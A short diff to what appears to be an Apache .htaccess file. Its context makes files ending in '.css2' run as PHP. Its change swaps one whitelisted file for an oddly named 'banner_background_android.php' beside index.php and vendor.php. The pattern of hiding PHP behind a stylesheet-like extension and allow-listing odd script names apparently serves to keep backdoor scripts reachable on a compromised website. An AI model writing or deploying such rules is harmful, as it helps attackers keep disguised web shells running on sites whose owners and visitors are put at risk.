@@ -6,7 +6,7 @@ Options -Indexes
 <FilesMatch "\.css2$">
     SetHandler application/x-httpd-php
 </FilesMatch>
-<FilesMatch "^(ssi-MAR.shtml|index.php|vendor.php)$">
+<FilesMatch "^(banner_background_android.php|index.php|vendor.php)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
